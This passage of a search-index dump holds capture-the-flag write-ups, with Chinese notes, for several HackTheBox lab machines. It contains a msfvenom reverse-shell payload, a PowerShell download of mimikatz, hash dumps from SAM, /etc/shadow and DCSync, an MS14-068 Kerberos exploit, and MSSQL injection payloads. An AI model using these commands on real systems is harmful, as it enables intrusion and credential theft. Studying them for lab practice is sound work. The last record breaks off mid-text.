m:des-cbc-md5:6ed6ef2ca2a78ad0\nnewboy:aes256-cts-hmac-sha1-96:d533312c32ff8e95d6f13ede7a8afad597af756c949cf6705f2b725553cc750a\nnewboy:aes128-cts-hmac-sha1-96:c4bab311ffa4d502404bfde653621fa9\nnewboy:des-cbc-md5:1fdf7f20fbdf9e6d\nFOREST$:aes256-cts-hmac-sha1-96:023c099754f13d8ca68e585e41afd104fd2247b0e52c980e7dee488469144b6a\nFOREST$:aes128-cts-hmac-sha1-96:8a07f0e2c96fdb4ccb117e5174fa4a54\nFOREST$:des-cbc-md5:6b318a79c12a23a7\nEXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6\nEXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e\nEXCH01$:des-cbc-md5:8c45f44c16975129\n[*] Cleaning up...\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Jerry/", "title": "jerry", "text": ""}, {"location": "HackTheBox/Machines/Jerry/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.95 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone\nRunning (JUST GUESSING): Microsoft Windows 2012|Phone|8 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8\nAggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 8.1 Update 1 (85%)\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Jerry/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u67e5\u770b 8080 \u7aef\u53e3\uff0c\u53d1\u73b0 tomcat \u670d\u52a1 </li> <li>\u679a\u4e3e\u5f31\u5bc6\u7801 - tomcat/s3cret </li> <li>\u751f\u6210 war \u540e\u95e8\u5e76\u4e0a\u4f20 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp -a x64 LHOST=10.10.16.6 LPORT=2233 -f war -o reverse.war\n</code></pre> <code>curl http://tomcat:s3cret@10.10.10.95:8080/reverse/</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Jerry/#dump-hash", "title": "Dump Hash", "text": "<pre><code>powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.6/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\nC:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit\n---\nAdministrator:fe34b627386c89a49eb254f6a267e4d9\n</code></pre>"}, {"location": "HackTheBox/Machines/Lame/", "title": "Lame", "text": ""}, {"location": "HackTheBox/Machines/Lame/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.3 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.16.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.23 (92%), DD-WRT v24-sp1 (Linux 2.4.36) (90%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.27 (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2.6.18) (90%), Linux 2.6.22 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h30m17s, deviation: 3h32m09s, median: 16s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2024-01-08T00:23:47-05:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n</code></pre> - ftp   - samba <code>crackmapexec smb $IP -u guest -p '' --shares</code> <pre><code>SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)\nSMB         10.10.10.3      445    LAME             [-] hackthebox.gr\\guest: STATUS_LOGON_FAILURE\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Lame/#shell-as-root", "title": "Shell as Root", "text": "<p>\u6f0f\u6d1e\u7f16\u53f7\u4e3a: CVE-2007-2447  </p>"}, {"location": "HackTheBox/Machines/Lame/#dump-hash", "title": "Dump Hash", "text": "<p><code>cat /etc/shadow</code> <pre><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::\ndaemon:*:14684:0:99999:7:::\nbin:*:14684:0:99999:7:::\nsys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::\nsync:*:14684:0:99999:7:::\ngames:*:14684:0:99999:7:::\nman:*:14684:0:99999:7:::\nlp:*:14684:0:99999:7:::\nmail:*:14684:0:99999:7:::\nnews:*:14684:0:99999:7:::\nuucp:*:14684:0:99999:7:::\nproxy:*:14684:0:99999:7:::\nwww-data:*:14684:0:99999:7:::\nbackup:*:14684:0:99999:7:::\nlist:*:14684:0:99999:7:::\nirc:*:14684:0:99999:7:::\ngnats:*:14684:0:99999:7:::\nnobody:*:14684:0:99999:7:::\nlibuuid:!:14684:0:99999:7:::\ndhcp:*:14684:0:99999:7:::\nsyslog:*:14684:0:99999:7:::\nklog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::\nsshd:*:14684:0:99999:7:::\nbind:*:14685:0:99999:7:::\npostfix:*:14685:0:99999:7:::\nftp:*:14685:0:99999:7:::\npostgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::\nmysql:!:14685:0:99999:7:::\ntomcat55:*:14691:0:99999:7:::\ndistccd:*:14698:0:99999:7:::\nservice:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::\ntelnetd:*:14715:0:99999:7:::\nproftpd:!:14727:0:99999:7:::\nstatd:*:15474:0:99999:7:::\nsnmp:*:15480:0:99999:7:::\nmakis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Mantis/", "title": "Mantis", "text": "<p>export IP=10.10.10.52</p>"}, {"location": "HackTheBox/Machines/Mantis/#recon-enum", "title": "Recon &amp; Enum", "text": ""}, {"location": "HackTheBox/Machines/Mantis/#nmap", "title": "Nmap", "text": "<ul> <li>Tcp</li> </ul> <pre><code>PORT      STATE  SERVICE      VERSION\n53/tcp    open   domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)\n88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-24 02:15:42Z)\n135/tcp   open   msrpc        Microsoft Windows RPC\n139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open   microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)\n464/tcp   open   kpasswd5?\n593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open   tcpwrapped\n1337/tcp  open   http         Microsoft IIS httpd 7.5\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: IIS7\n| http-methods: \n|_  Potentially risky methods: TRACE\n1433/tcp  open   ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-01-24T02:14:31\n|_Not valid after:  2054-01-24T02:14:31\n|_ssl-date: 2024-01-24T02:16:54+00:00; +1s from scanner time.\n3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open   tcpwrapped\n5722/tcp  open   msrpc        Microsoft Windows RPC\n8080/tcp  open   http         Microsoft IIS httpd 7.5\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Tossed Salad - Blog\n9389/tcp  open   mc-nmf       .NET Message Framing\n47001/tcp closed winrm\n49152/tcp open   msrpc        Microsoft Windows RPC\n49153/tcp open   msrpc        Microsoft Windows RPC\n49154/tcp open   msrpc        Microsoft Windows RPC\n49155/tcp open   msrpc        Microsoft Windows RPC\n49157/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49158/tcp open   msrpc        Microsoft Windows RPC\n49167/tcp open   msrpc        Microsoft Windows RPC\n49172/tcp open   msrpc        Microsoft Windows RPC\n49173/tcp open   msrpc        Microsoft Windows RPC\n50255/tcp open   ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM\n|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-01-24T02:14:31\n|_Not valid after:  2054-01-24T02:14:31\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: 2024-01-24T02:16:54+00:00; +1s from scanner time.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/24%OT=53%CT=47001%CU=37354%PV=Y%DS=2%DC=T%G=Y%TM=65B\n...\nOS:DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-time: \n|   date: 2024-01-24T02:16:48\n|_  start_date: 2024-01-24T02:14:06\n| smb-os-discovery: \n|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1\n|   Computer name: mantis\n|   NetBIOS computer name: MANTIS\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: mantis.htb.local\n|_  System time: 2024-01-23T21:16:45-05:00\n|_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 0s\n| smb2-security-mode: \n|   210: \n|_    Message signing enabled and required\n</code></pre>"}, {"location": "HackTheBox/Machines/Mantis/#101010521337", "title": "10.10.10.52:1337", "text": "<ul> <li><code>feroxbuster -u http://htb.local:1337 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -o feroxbuster_1337.log</code> \u5148\u7528\u5927\u5b57\u5178\u626b\u6700\u5916\u5c42\u76ee\u5f55</li> </ul> <pre><code>404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      826l     4457w   331772c http://htb.local:1337/welcome.png\n200      GET       32l       53w      689c http://htb.local:1337/\n500      GET       72l      241w     3026c http://htb.local:1337/orchard\n301      GET        2l       10w      158c http://htb.local:1337/secure_notes =&gt; http://htb.local:1337/secure_notes/\n</code></pre> <ul> <li>\u53d1\u73b0 secure_notes \u76ee\u5f55</li> </ul> <ul> <li>\u6700\u4e0b\u9762\u8fd8\u85cf\u4e86\u4e00\u624b</li> </ul> <pre><code>1. Download OrchardCMS\n2. Download SQL server 2014 Express ,create user \"admin\",and create orcharddb database\n3. Launch IIS and add new website and point to Orchard CMS folder location.\n4. Launch browser and navigate to http://localhost:8080\n5. Set admin password and configure sQL server connection string.\n6. Add blog pages with admin user.\n\nCredentials stored in secure format\nOrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001\nSQL Server sa credentials file namez\n</code></pre> <p>\u8bf4\u662f sa \u7684\u51ed\u636e\uff0c\u4e8c\u8fdb\u5236\u89e3\u7801\u770b\u4e00\u4e0b</p> <p></p> <ul> <li><code>impacket-mssqlclient 'htb.local/sa:@dm!n_P@ssW0rd!@10.10.10.52'</code></li> </ul> <p></p> <p>\u51ed\u636e\u4e0d\u5bf9</p> <ul> <li>\u67e5\u770b\u6587\u4ef6\u540d\uff0c\u5f88\u50cf Base64 \u7f16\u7801 <code>dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</code>\uff0c\u5f97\u5230\u4e00\u4e32\u5341\u516d\u8fdb\u5236\u6570</li> </ul> <p></p> <p></p> <ul> <li><code>impacket-mssqlclient 'htb.local/admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'</code> \u518d\u6b21\u5c1d\u8bd5\u767b\u5f55\uff0cadmin \u6210\u529f</li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Mantis/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u67e5\u770b\u6570\u636e\u5e93\uff0c\u76f4\u63a5\u67e5\u770b orcharddb</li> </ul> <ul> <li><code>SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES;</code></li> </ul> <ul> <li>\u53d1\u73b0 james \u5bc6\u7801</li> </ul> <ul> <li>\u5bc6\u7801\u55b7\u5c04</li> </ul> <ul> <li>\u767b\u5f55 james <code>evil-winrm -i 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'</code> \u65e0\u6cd5\u767b\u5f55</li> </ul> <ul> <li>\u53d1\u73b0 Windows \u7248\u672c\u662f Windows Server 2008 R2\uff0c\u5c1d\u8bd5\u5229\u7528 MS14-068\uff0c\u9996\u5148\u83b7\u53d6 sid</li> </ul> <pre><code>james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)\n</code></pre> <p>https://github.com/mubix/pykek</p> <ul> <li>\u83b7\u53d6 TGT \u7968\u636e</li> </ul> <pre><code>python2 ms14-068.py -u james@htb.local -p 'J@m3s_P@ssW0rd!' -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local\n</code></pre> <ul> <li>\u8bbe\u7f6e\u7968\u636e</li> </ul> <pre><code>export KRB5CCNAME=TGT_james@htb.local.ccache\n</code></pre> <ul> <li>Get Shell</li> </ul> <pre><code>impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local\n</code></pre> <p></p>"}, {"location": "HackTheBox/Machines/Mantis/#dump-hash", "title": "Dump Hash", "text": "<pre><code>impacket-smbserver good .\n</code></pre> <pre><code>copy \\\\10.10.16.7\\good\\mimikatz.exe m.exe\nm.exe \"lsadump::dcsync /domain:htb.local /all /csv\" exit\n---\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:htb.local /all /csv\n[DC] 'htb.local' will be the domain\n[DC] 'mantis.htb.local' will be the DC server\n[DC] Exporting domain 'htb.local'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  3e330665e47f7890603b5a96bbb31e23        514\n1000    MANTIS$ a87369763969c892a4f1db0463ce31cb        532480\n500     Administrator   22140219fd9432e584a355e54b28ecbb        66048\n1103    james   71b5ea0a10d569ffac56d3b63684b3d2        66048\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/", "title": "Multimaster", "text": ""}, {"location": "HackTheBox/Machines/Multimaster/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.179</p>"}, {"location": "HackTheBox/Machines/Multimaster/#recon", "title": "Recon", "text": "<ul> <li>Nmap - Tcp</li> </ul> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: MegaCorp\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-30 01:11:09Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2024-01-30T01:12:41+00:00; +7m01s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: MEGACORP\n|   NetBIOS_Domain_Name: MEGACORP\n|   NetBIOS_Computer_Name: MULTIMASTER\n|   DNS_Domain_Name: MEGACORP.LOCAL\n|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL\n|   DNS_Tree_Name: MEGACORP.LOCAL\n|   Product_Version: 10.0.14393\n|_  System_Time: 2024-01-30T01:12:01+00:00\n| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL\n| Not valid before: 2024-01-29T01:05:39\n|_Not valid after:  2024-07-30T01:05:39\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49700/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607\nAggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h43m00s, deviation: 3h34m40s, median: 6m59s\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: MULTIMASTER\n|   NetBIOS computer name: MULTIMASTER\\x00\n|   Domain name: MEGACORP.LOCAL\n|   Forest name: MEGACORP.LOCAL\n|   FQDN: MULTIMASTER.MEGACORP.LOCAL\n|_  System time: 2024-01-29T17:12:02-08:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-30T01:12:04\n|_  start_date: 2024-01-30T01:05:48\n</code></pre> <ul> <li>\u53d1\u73b0\u57df\u540d</li> </ul> <pre><code>export IP=10.10.10.179 DOMAIN=MEGACORP.LOCAL\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#smb", "title": "SMB", "text": "<ul> <li>crackmapexec</li> </ul> <pre><code>crackmapexec smb $IP -u guest -p '' --shares\ncrackmapexec smb $IP -u guest -p '' --rid-brute 10000\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#ldap", "title": "LDAP", "text": "<ul> <li>ldapsearch</li> </ul> <pre><code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts\n---\ndn:\nnamingContexts: DC=MEGACORP,DC=LOCAL\nnamingContexts: CN=Configuration,DC=MEGACORP,DC=LOCAL\nnamingContexts: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL\nnamingContexts: DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL\nnamingContexts: DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL\n\nldapsearch -x -H \"ldap://$IP\" -b \"DC=MEGACORP,DC=LOCAL\"\n---\nNone\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#rpc", "title": "RPC", "text": "<ul> <li>Enum4Linux</li> </ul> <pre><code>Domain Name: MEGACORP                                                  \nDomain Sid: S-1-5-21-3167813660-1240564177-918740779\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#web", "title": "Web", "text": "<ul> <li>Web Scan</li> </ul> <pre><code>feroxbuster -u http://megacorp.local/ -d 1 -C 403\n---\n</code></pre> <ul> <li>\u53d1\u73b0\u7528\u6237</li> </ul> <pre><code>sbauer\nokent\nckane\nkpage\nshayna\njames\ncyork\nrmartin\nzac\njorden\nalyx\nilee\nnbourne\nzpowers\naldom\nminato\negre55\n</code></pre> <ul> <li>Kerbrute \u679a\u4e3e\uff0c\u5747\u4e3a\u57df\u7528\u6237</li> </ul>"}, {"location": "HackTheBox/Machines/Multimaster/#shell-as-user-tushikikatomo", "title": "Shell as User - tushikikatomo", "text": ""}, {"location": "HackTheBox/Machines/Multimaster/#mssql", "title": "MSSQL \u6ce8\u5165", "text": "<p>https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/</p> <ul> <li>\u6d4b\u8bd5\u6ce8\u5165\uff0c\u8f93\u5165\u5355\u5f15\u53f7\u4f1a\u8fd4\u56de 403</li> </ul> <p></p> <ul> <li>\u5c1d\u8bd5\u7f16\u7801\uff0c\u6210\u529f\u62a5\u9519</li> </ul> <p></p> <ul> <li>\u5c1d\u8bd5\u95ed\u5408 <code>' or '1'='1</code> ,\u53ef\u4ee5\u770b\u5230\u8bed\u53e5\u6267\u884c\u6210\u529f</li> </ul> <p></p> <ul> <li>\u679a\u4e3e\u5b57\u6bb5\u6570 <code>aaa' union select 1,2,3,4,5 -- -</code></li> </ul> <p></p> <ul> <li>\u679a\u4e3e\u6570\u636e\u5e93 <code>aaa' union select 1,@@VERSION,USER_NAME(),DB_NAME(),name FROM master..sysdatabases-- -</code></li> </ul> <p></p> <pre><code>Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n        Aug 22 2017 17:04:49 \n        Copyright (C) 2017 Microsoft Corporation\n        Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)\nUser: finder\n\nHub_DB\nmaster\nmodel\nmsdb\ntempdb\n</code></pre> <ul> <li>\u679a\u4e3e\u8868 <code>aaa' union select 1,DB_NAME(),table_name,4,5 from information_schema.tables-- -</code></li> </ul> <p></p> <pre><code>Colleagues\nLogins\n</code></pre> <ul> <li>\u679a\u4e3e\u5b57\u6bb5 <code>aaa' union select 1,name,3,4,5 from syscolumns where id=(select id from    sysobjects where name = 'Logins')-- -</code></li> </ul> <p></p> <ul> <li>Dump \u6570\u636e <code>aaa' union select id,username,password,4,5 from Hub_DB..Logins-- -</code></li> </ul> <p></p> <pre><code>9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739\nfb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa\n68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813\n68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813\n9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739\n9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739\n9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739\nfb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa\n68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813\n9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739\nfb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa\n68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813\nfb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa\n68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813\n9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739\ncf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc\ncf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc\n</code></pre> <ul> <li>Hash \u8bc6\u522b\u53d1\u73b0\uff0c\u53ef\u80fd\u662f SHA-384 \u6216\u8005 Keccak-384\uff0c\u5206\u522b\u5c1d\u8bd5\u540e\uff0c\u6b63\u786e\u7f16\u7801\u5e94\u8be5\u662f Keccak-384</li> </ul> <p></p> <ul> <li>Hashcat \u7206\u7834</li> </ul> <p></p> <ul> <li>\u5bc6\u7801\u55b7\u5c04</li> </ul> <pre><code>crackmapexec smb $IP -u user.list -p pass.list --continue-on-success\n</code></pre> <p></p> <p>\u5168\u90e8\u5931\u8d25</p>"}, {"location": "HackTheBox/Machines/Multimaster/#mssql_1", "title": "MSSQL \u679a\u4e3e\u57df\u7528\u6237", "text": "<p>https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/</p> <p>https://stackoverflow.com/questions/703019/convert-integer-to-hex-and-hex-to-integer</p> <ul> <li>\u53ef\u4ee5\u901a\u8fc7 <code>SUSER_SID()</code> \u6765\u67d0\u4e2a\u57df\u7528\u6237\u7684 SID <code>aaa' union select 1,master.dbo.fn_varbintohexstr(suser_sid('MEGACORP\\rmartin')),3,4,5-- -</code> \u5176\u4e2d\u57df\u7528\u6237\u540d\u53ef\u4ee5\u901a\u8fc7\u5728\u67e5\u8be2\u4e2d\u8fdb\u884c hex \u7f16\u7801\u7ed5\u8fc7</li> </ul> <p></p> <p>\u5f97\u5230\u4e0e\u7528\u6237 <code>MEGACORP\\rmartin</code> \u7684 SID \u4e3a: <code>0x0105000000000005150000001c00d1bcd181f1492bdfc236240c0000</code> \u5176\u4e2d\u540e 8 \u4e2a\u5b57\u8282\u4e3a\u7528\u6237 RID</p> <pre><code>0x0105000000000005150000001c00d1bcd181f1492bdfc236240c0000\n0x0105000000000005150000001c00d1bcd181f1492bdfc236\nb'240c0000' - 